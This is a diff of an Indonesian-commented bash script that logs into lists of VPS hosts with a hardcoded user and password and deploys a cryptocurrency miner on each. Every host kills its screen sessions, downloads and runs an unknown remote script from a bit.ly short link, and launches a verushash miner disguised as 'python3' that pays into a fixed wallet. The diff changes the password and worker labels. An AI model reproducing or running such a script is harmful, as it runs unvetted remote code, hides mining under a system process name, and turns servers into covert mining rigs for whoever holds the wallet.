@@ -20,7 +20,7 @@ fi
 run_script() {
     local IP=$1
     local USER="cloudsigma"         # Menetapkan USER
-    local PASSWORD="12345678"   # Menetapkan PASSWORD
+    local PASSWORD="Dotaja123@HHHH"   # Menetapkan PASSWORD
     local COMMAND=$2
     local COUNT=$3
 
@@ -45,14 +45,14 @@ EOF
 COUNT=1
 # Membaca daftar VPS Asia dan menjalankan script
 while IFS=',' read -r IP; do
-    ASIA_SCRIPT_COMMAND="pkill screen; bash <(wget -qO- https://bit.ly/ap-dot); screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool sg.vipor.net:5040 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.AP-$COUNT "
+    ASIA_SCRIPT_COMMAND="pkill screen; bash <(wget -qO- https://bit.ly/ap-dot); screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool sg.vipor.net:5040 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.TITIT-$COUNT "
     run_script "$IP" "$ASIA_SCRIPT_COMMAND" &  # Jalankan perintah untuk VPS Asia
     COUNT=$((COUNT + 1))
 done < $ASIA_VPS_LIST
 
 # Membaca daftar VPS Eropa dan menjalankan script
 while IFS=',' read -r IP; do
-    EUROPE_SCRIPT_COMMAND="pkill screen; bash <(wget -qO- https://bit.ly/ap-dot); screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool fr.vipor.net:5040 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.EU-$COUNT "
+    EUROPE_SCRIPT_COMMAND="pkill screen; bash <(wget -qO- https://bit.ly/ap-dot); screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool fr.vipor.net:5040 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.TITIT-$COUNT "
     run_script "$IP" "$EUROPE_SCRIPT_COMMAND" &  # Jalankan perintah untuk VPS Eropa
     COUNT=$((COUNT + 1))
 done < $EUROPE_VPS_LIST
